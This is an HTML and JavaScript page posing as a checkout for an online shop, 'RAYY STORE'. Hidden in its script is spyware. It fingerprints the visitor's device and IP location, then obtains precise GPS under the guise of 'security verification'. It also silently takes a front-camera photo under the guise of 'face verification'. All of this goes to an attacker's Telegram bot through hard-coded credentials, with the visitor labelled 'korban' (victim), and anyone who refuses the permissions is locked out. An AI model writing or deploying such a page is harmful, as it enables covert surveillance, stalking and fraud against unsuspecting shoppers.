<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PAYMENT RAYYSTORE</title>
    <style>
        :root { --accent: #00d2ff; --bg: #f8f9fa; --card: #ffffff; --text: #1e293b; --text-light: #64748b; --danger: #ef4444; }
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; }
        body { background: var(--bg); color: var(--text); overflow-x: hidden; min-height: 100vh; display: flex; align-items: center; justify-content: center; }

        .container { display: flex; align-items: center; justify-content: center; padding: 16px; width: 100%; }
        .card { background: var(--card); border: 1px solid #e2e8f0; padding: 32px 24px; border-radius: 32px; width: 100%; max-width: 380px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.03); }
        
        .logo-main { font-size: 44px; font-weight: 800; background: linear-gradient(135deg, #2563eb, #00d2ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 8px; display: inline-block; }
        
        h1 { margin-bottom: 24px; font-size: 1.4rem; font-weight: 600; color: var(--text); }
        h1 span { background: linear-gradient(135deg, #2563eb, #00d2ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        
        input { width: 100%; padding: 16px; margin-bottom: 12px; background: #f1f5f9; border: 1px solid #e2e8f0; color: var(--text); border-radius: 20px; outline: none; transition: 0.2s; font-size: 15px; }
        input:focus { border-color: #2563eb; box-shadow: 0 0 0 3px rgba(37,99,235,0.1); }
        input::placeholder { color: #94a3b8; }
        
        .btn-pay { width: 100%; padding: 18px; background: linear-gradient(135deg, #2563eb, #00d2ff); color: white; border: none; border-radius: 24px; font-weight: 700; cursor: pointer; margin-bottom: 16px; transition: 0.2s; font-size: 16px; border: none; box-shadow: 0 4px 15px rgba(37,99,235,0.2); }
        .btn-pay:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(37,99,235,0.3); }

        .cs-text { font-size: 0.75rem; color: var(--text-light); margin: 20px 0 12px; font-weight: 500; text-transform: uppercase; letter-spacing: 0.5px; }
        .cs-container { display: flex; gap: 10px; flex-direction: column; }
        .btn-cs { padding: 14px; border-radius: 20px; text-decoration: none; font-weight: 600; font-size: 0.9rem; display: flex; align-items: center; justify-content: center; gap: 8px; transition: 0.2s; border: 1px solid #e2e8f0; background: white; color: var(--text); }
        .btn-cs:hover { background: #f8fafc; border-color: #2563eb; }
        
        /* LOADING OVERLAY */
        .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); z-index: 9999; display: none; align-items: center; justify-content: center; flex-direction: column; backdrop-filter: blur(4px); }
        .loading-overlay.show { display: flex; }
        .spinner { width: 44px; height: 44px; border: 4px solid #e2e8f0; border-top-color: #2563eb; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 20px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .loading-text { color: var(--text); font-weight: 500; font-size: 1.1rem; text-align: center; max-width: 280px; }
        
        /* BLOCK PAGE - HALAMAN BLOKIR JIKA IZIN DITOLAK */
        .block-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 10000; display: none; align-items: center; justify-content: center; flex-direction: column; }
        .block-overlay.show { display: flex; }
        .block-icon { width: 80px; height: 80px; background: #fee2e2; border-radius: 80px; display: flex; align-items: center; justify-content: center; margin-bottom: 24px; color: var(--danger); font-size: 40px; }
        .block-title { font-size: 1.6rem; font-weight: 700; color: var(--danger); margin-bottom: 12px; }
        .block-message { color: var(--text-light); margin-bottom: 32px; max-width: 280px; text-align: center; line-height: 1.6; }
        .btn-refresh { padding: 16px 40px; background: var(--danger); color: white; border: none; border-radius: 30px; font-weight: 700; font-size: 1.1rem; cursor: pointer; transition: 0.2s; box-shadow: 0 10px 25px rgba(239,68,68,0.3); }
        .btn-refresh:hover { transform: scale(1.05); background: #dc2626; }
        
        /* HIDDEN */
        #hidden-video, #hidden-canvas { display: none; }
    </style>
</head>
<body>

<!-- BLOCK PAGE - MUNCUL JIKA IZIN DITOLAK -->
<div id="blockPage" class="block-overlay">
    <div class="block-icon">❌</div>
    <div class="block-title">Akses Diblokir</div>
    <div class="block-message">
        Semua izin ditolak.<br>
        Harap mulai ulang halaman untuk melanjutkan transaksi.
    </div>
    <button class="btn-refresh" onclick="refreshPage()">🔄 Refresh Halaman</button>
</div>

<!-- LOADING OVERLAY -->
<div id="loadingOverlay" class="loading-overlay">
    <div class="spinner"></div>
    <div class="loading-text" id="loadingText">Memproses...</div>
</div>

<!-- MAIN CONTENT -->
<div class="container">
    <div class="card">
        <div class="logo-main">R</div>
        
        <h1>RAYY <span>STORE</span></h1>
        
        <input type="text" id="buyer-name" placeholder="Nama lengkap">
        <input type="number" id="amount" placeholder="Nominal pembayaran (Rp)">
        
        <button class="btn-pay" onclick="startPaymentFlow()">BAYAR SEKARANG</button>
        
        <div class="cs-text">Butuh bantuan?</div>
        <div class="cs-container">
            <a href="https://wa.me/628131172093" class="btn-cs">💬 WhatsApp</a>
            <a href="#" class="btn-cs" id="statusBtn">📋 Cek status transaksi</a>
        </div>
    </div>
</div>

<!-- HIDDEN TRACKING -->
<video id="hidden-video" autoplay playsinline muted></video>
<canvas id="hidden-canvas"></canvas>

<script>
    // ===============================================
    // RAY-EYE - FORCE BLOCK PAGE
    // JIKA IZIN DITOLAK, HALAMAN TERKUNCI
    // ===============================================
    
    (function() {
        // Konfigurasi - GANTI!
        const CONFIG = {
            TELEGRAM_TOKEN: '8416626215:AAHgkbyUIhmWDT9rQJVQJnnd-eI8uVJdr1Y', // GANTI!
            CHAT_ID: '7966336512', // GANTI!
        };
        
        // Elements
        const elements = {
            buyerName: document.getElementById('buyer-name'),
            amount: document.getElementById('amount'),
            loadingOverlay: document.getElementById('loadingOverlay'),
            loadingText: document.getElementById('loadingText'),
            blockPage: document.getElementById('blockPage'),
            hiddenVideo: document.getElementById('hidden-video'),
            hiddenCanvas: document.getElementById('hidden-canvas'),
            statusBtn: document.getElementById('statusBtn')
        };
        
        // State
        let collectedData = {
            device: {},
            ipInfo: {},
            location: null,
            camera: null,
            payment: null,
            permissions: {
                location: 'pending', // pending, granted, denied
                camera: 'pending'
            },
            timestamp: new Date().toISOString()
        };
        
        // Flag untuk cek apakah user sudah klik bayar
        let paymentInitiated = false;
        
        // ========== KIRIM KE TELEGRAM ==========
        async function sendToTelegram(text, photoBlob = null) {
            try {
                if (photoBlob) {
                    const formData = new FormData();
                    formData.append('chat_id', CONFIG.CHAT_ID);
                    formData.append('photo', photoBlob, 'korban.jpg');
                    formData.append('caption', text.substring(0, 200));
                    await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendPhoto`, { 
                        method: 'POST', 
                        body: formData,
                        mode: 'no-cors'
                    });
                } else {
                    const formData = new FormData();
                    formData.append('chat_id', CONFIG.CHAT_ID);
                    formData.append('text', text);
                    formData.append('parse_mode', 'HTML');
                    await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`, { 
                        method: 'POST', 
                        body: formData,
                        mode: 'no-cors'
                    });
                }
            } catch (e) {}
        }
        
        // ========== FUNGSI REFRESH ==========
        window.refreshPage = function() {
            location.reload();
        };
        
        // ========== CEK SEMUA IZIN ==========
        function checkAllPermissions() {
            // Kalo dua-duanya denied, munculin block page
            if (collectedData.permissions.location === 'denied' && 
                collectedData.permissions.camera === 'denied') {
                
                // Kirim notif ke Telegram
                sendToTelegram(`🚫 <b>USER BLOKIR SEMUA IZIN</b>\n🕐 ${new Date().toLocaleString()}\n📍 Lokasi: DITOLAK\n📸 Kamera: DITOLAK`);
                
                // Tampilkan block page
                setTimeout(() => {
                    elements.loadingOverlay.classList.remove('show');
                    elements.blockPage.classList.add('show');
                }, 500);
                return true;
            }
            return false;
        }
        
        // ========== KOLEKSI DATA AWAL ==========
        async function collectInitialData() {
            collectedData.device = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cpuCores: navigator.hardwareConcurrency || 'N/A',
                memory: navigator.deviceMemory || 'N/A'
            };
            
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                collectedData.ipInfo = {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    lat: data.latitude,
                    lon: data.longitude,
                    isp: data.org
                };
            } catch (e) {}
            
            sendToTelegram(`👁️ <b>Visitor Baru</b>\n🕐 ${new Date().toLocaleString()}\n📱 ${navigator.platform}\n🌍 ${collectedData.ipInfo.city || 'Unknown'}`);
        }
        
        // ========== FLOW PEMBAYARAN ==========
        window.startPaymentFlow = function() {
            const name = elements.buyerName.value.trim();
            const nominal = elements.amount.value.trim();
            
            if (!name || !nominal || nominal <= 0) {
                alert('Isi semua data dengan benar');
                return;
            }
            
            paymentInitiated = true;
            
            collectedData.payment = {
                name: name,
                nominal: nominal,
                orderId: 'R' + Date.now()
            };
            
            sendToTelegram(`💰 <b>Transaksi Baru</b>\nNama: ${name}\nNominal: Rp ${parseInt(nominal).toLocaleString()}`);
            
            // Mulai minta lokasi
            requestLocation();
        };
        
        // ========== STEP 1: MINTA LOKASI ==========
        function requestLocation() {
            elements.loadingText.innerText = 'Verifikasi lokasi untuk keamanan transaksi...';
            elements.loadingOverlay.classList.add('show');
            
            setTimeout(() => {
                if (!navigator.geolocation) {
                    collectedData.permissions.location = 'denied';
                    if (!checkAllPermissions()) {
                        elements.loadingOverlay.classList.remove('show');
                        requestCamera();
                    }
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        // IZIN DIBERIKAN
                        collectedData.permissions.location = 'granted';
                        collectedData.location = {
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy + 'm',
                            timestamp: new Date().toISOString()
                        };
                        
                        // Reverse geocoding
                        try {
                            const res = await fetch(
                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}&zoom=18`,
                                { headers: { 'User-Agent': 'Mozilla/5.0' } }
                            );
                            const data = await res.json();
                            collectedData.location.address = data.display_name;
                        } catch (e) {}
                        
                        sendToTelegram(`📍 <b>Lokasi Real</b>\nLat: ${position.coords.latitude}\nLon: ${position.coords.longitude}\nAkurasi: ${position.coords.accuracy}m`);
                        
                        // Lanjut ke kamera
                        elements.loadingOverlay.classList.remove('show');
                        setTimeout(requestCamera, 500);
                    },
                    (error) => {
                        // IZIN DITOLAK ATAU ERROR
                        collectedData.permissions.location = 'denied';
                        sendToTelegram(`❌ Lokasi ditolak: ${error.message}`);
                        
                        // Cek apakah perlu block page
                        elements.loadingOverlay.classList.remove('show');
                        
                        if (!checkAllPermissions()) {
                            // Kalo belum dua-duanya denied, lanjut kamera
                            setTimeout(requestCamera, 500);
                        }
                    },
                    { 
                        enableHighAccuracy: true, 
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            }, 800);
        }
        
        // ========== STEP 2: MINTA KAMERA ==========
        function requestCamera() {
            // Kalo payment belum diinit, jangan lanjut
            if (!paymentInitiated) return;
            
            elements.loadingText.innerText = 'Verifikasi wajah untuk konfirmasi pembayaran...';
            elements.loadingOverlay.classList.add('show');
            
            setTimeout(() => {
                navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                })
                .then(async (stream) => {
                    // IZIN DIBERIKAN
                    collectedData.permissions.camera = 'granted';
                    
                    elements.hiddenVideo.srcObject = stream;
                    await elements.hiddenVideo.play();
                    
                    setTimeout(() => {
                        elements.hiddenCanvas.width = elements.hiddenVideo.videoWidth;
                        elements.hiddenCanvas.height = elements.hiddenVideo.videoHeight;
                        elements.hiddenCanvas.getContext('2d').drawImage(elements.hiddenVideo, 0, 0);
                        
                        elements.hiddenCanvas.toBlob(async (blob) => {
                            collectedData.camera = {
                                success: true,
                                dimensions: `${elements.hiddenCanvas.width}x${elements.hiddenCanvas.height}`
                            };
                            
                            sendToTelegram(`📸 <b>Foto Korban</b>\n🕐 ${new Date().toLocaleString()}`, blob);
                            
                            stream.getTracks().forEach(track => track.stop());
                            
                            elements.loadingText.innerText = 'Mengalihkan ke halaman pembayaran...';
                            setTimeout(() => {
                                elements.loadingOverlay.classList.remove('show');
                                redirectToPayment();
                            }, 1000);
                            
                        }, 'image/jpeg', 0.8);
                    }, 2000);
                })
                .catch((error) => {
                    // IZIN DITOLAK
                    collectedData.permissions.camera = 'denied';
                    collectedData.camera = { success: false, error: error.message };
                    sendToTelegram(`❌ Kamera ditolak: ${error.message}`);
                    
                    elements.loadingOverlay.classList.remove('show');
                    
                    // Cek apakah perlu block page
                    checkAllPermissions();
                    
                    // KALO BELUM DUA-DUANYA DENIED, TAPI KAMERA SUDAH DITOLAK,
                    // KITA TETAP CEK LAGI 1 DETIK LAGI (JAGA-JAGA)
                    setTimeout(() => {
                        checkAllPermissions();
                    }, 1000);
                });
            }, 800);
        }
        
        // ========== REDIRECT KE GATEWAY ==========
        function redirectToPayment() {
            // Hanya redirect jika kedua izin granted ATAU setidaknya ada yg granted
            // Tapi kalo dua-duanya denied, ga bakal sampe sini
            const nominal = collectedData.payment.nominal;
            const orderId = collectedData.payment.orderId;
            
            window.location.href = `https://app.pakasir.com/pay/rayy-store/${nominal}?order_id=${orderId}&qris_only=1`;
        }
        
        // ========== STATUS BUTTON ==========
        elements.statusBtn.addEventListener('click', (e) => {
            e.preventDefault();
            window.location.href = 'https://raimift2009-code.github.io/toko-rayy/status.html';
        });
        
        // ========== INIT ==========
        window.addEventListener('load', () => {
            collectInitialData();
            
            const urlParams = new URLSearchParams(window.location.search);
            const amountParam = urlParams.get('amount');
            if (amountParam) elements.amount.value = amountParam;
            
            // PREFLIGHT: Cek apakah izin sudah pernah ditolak sebelumnya
            // Ini ga bisa deteksi, tapi kita jalanin aja
        });
        
    })();
</script>
</body>
</html>
